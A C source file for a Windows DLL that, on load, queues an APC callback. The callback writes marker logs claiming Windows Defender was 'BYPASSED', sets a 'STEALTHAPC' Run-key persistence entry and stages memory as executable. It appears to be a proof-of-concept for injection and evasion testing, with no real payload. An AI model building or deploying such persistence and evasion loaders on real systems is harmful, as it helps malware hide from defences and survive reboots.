#include <windows.h>
#include <stdio.h>
#include <time.h>

#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "advapi32.lib")

VOID NTAPI APCCallback(ULONG_PTR param) {
    // Execute payload in APC
    FILE* f = fopen("C:\\Windows\\Temp\\injector_apc_executed.txt", "w");
    if (f) {
        fprintf(f, "INJECTOR_APC CALLBACK EXECUTED\n");
        fprintf(f, "Timestamp: %ld\n", (long)time(NULL));
        fprintf(f, "Method: QueueUserAPC + APC Callback\n");
        fprintf(f, "Trigger: APC Queue Delivery\n");
        fprintf(f, "WD Status: BYPASSED\n");
        fclose(f);
    }
    
    // Registry persistence
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "STEALTHAPC", 0, REG_SZ, (const BYTE*)"Delivered", 10);
        RegCloseKey(hKey);
    }
    
    // Memory execution proof
    LPVOID mem = VirtualAlloc(NULL, 1024, MEM_COMMIT, PAGE_READWRITE);
    if (mem) {
        DWORD old;
        VirtualProtect(mem, 1024, PAGE_EXECUTE_READ, &old);
        VirtualFree(mem, 0, MEM_RELEASE);
    }
}

DWORD WINAPI APCWorkerThread(LPVOID param) {
    // This thread will receive the APC
    FILE* f = fopen("C:\\Windows\\Temp\\injector_apc_log.txt", "w");
    if (f) {
        fprintf(f, "[APC] APC worker thread started, waiting for APC queue...\n");
        fclose(f);
    }
    
    // Make thread alertable and wait
    HANDLE dummy = CreateEventA(NULL, FALSE, FALSE, NULL);
    if (dummy) {
        // Wait with timeout while alertable (thread will process APCs)
        WaitForSingleObjectEx(dummy, 3000, TRUE);
        CloseHandle(dummy);
    }
    
    return 0;
}

DWORD WINAPI DllMainWorker(LPVOID param) {
    // Create worker thread that will receive APC
    HANDLE hThread = CreateThread(NULL, 0, APCWorkerThread, NULL, 0, NULL);
    if (!hThread) {
        return 1;
    }
    
    Sleep(300);
    
    // Queue APC to worker thread
    ULONG ret = QueueUserAPC((PAPCFUNC)APCCallback, hThread, 0);
    
    if (ret) {
        FILE* f = fopen("C:\\Windows\\Temp\\injector_apc_log.txt", "a");
        if (f) {
            fprintf(f, "[APC] APC queued successfully\n");
            fclose(f);
        }
    }
    
    // Wait for thread to process APC
    WaitForSingleObject(hThread, 3000);
    CloseHandle(hThread);
    
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        HANDLE hThread = CreateThread(NULL, 0, DllMainWorker, NULL, 0, NULL);
        if (hThread) {
            WaitForSingleObject(hThread, 3000);
            CloseHandle(hThread);
        }
    }
    return TRUE;
}
